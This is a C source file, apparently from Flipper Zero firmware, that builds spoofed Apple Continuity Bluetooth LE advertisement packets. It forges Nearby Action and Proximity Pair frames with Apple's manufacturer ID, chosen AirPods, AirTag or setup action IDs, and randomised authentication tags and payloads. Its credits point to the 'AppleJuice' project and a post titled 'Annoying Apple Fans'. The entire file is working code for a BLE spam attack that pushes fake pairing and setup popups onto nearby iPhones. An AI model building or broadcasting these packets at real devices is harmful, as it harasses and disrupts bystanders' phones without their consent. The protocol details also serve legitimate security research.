#include "continuity.h"
#include <furi_hal_random.h>

// Hacked together by @Willy-JL
// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
// Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/

static const char* continuity_type_names[ContinuityTypeCount] = {
    [ContinuityTypeNearbyAction] = "Nearby Action",
    [ContinuityTypeProximityPair] = "Proximity Pair",
};
const char* continuity_get_type_name(ContinuityType type) {
    return continuity_type_names[type];
}

static size_t continuity_packet_sizes[ContinuityTypeCount] = {
    [ContinuityTypeNearbyAction] = 23,
    [ContinuityTypeProximityPair] = 31,
};
size_t continuity_get_packet_size(ContinuityType type) {
    return continuity_packet_sizes[type];
}

void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
    size_t i = 0;
    packet[i++] = continuity_get_packet_size(msg->type) - 1;
    packet[i++] = 0xff;
    packet[i++] = 0x4c;
    packet[i++] = 0x00;
    switch(msg->type) {
    case ContinuityTypeNearbyAction:
        packet[i++] = 0x04;
        packet[i++] = 0x04;
        packet[i++] = 0x2a;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x00;
        packet[i++] = 0x0f; // Type (Nearby Action)
        packet[i++] = 0x05; // Length
        packet[i++] = 0xc1; // Action Flags
        packet[i++] = msg->data.nearby_action.type;
        packet[i++] = (rand() % 256); // Authentication Tag
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Action Parameters
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    case ContinuityTypeProximityPair:
        packet[i++] = 0x07; // Type (Proximity Pair)
        packet[i++] = 0x19; // Length
        packet[i++] = msg->data.proximity_pair.prefix; // Prefix (paired 0x01 new0x07 airtag 0x05)
        packet[i++] = msg->data.proximity_pair.model >> 8;
        packet[i++] = msg->data.proximity_pair.model & 0xFF;
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = 0x00; // Device Color
        packet[i++] = 0x00;
        packet[i++] = (rand() % 256); // Encrypted Payload
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    default:
        break;
    }
}
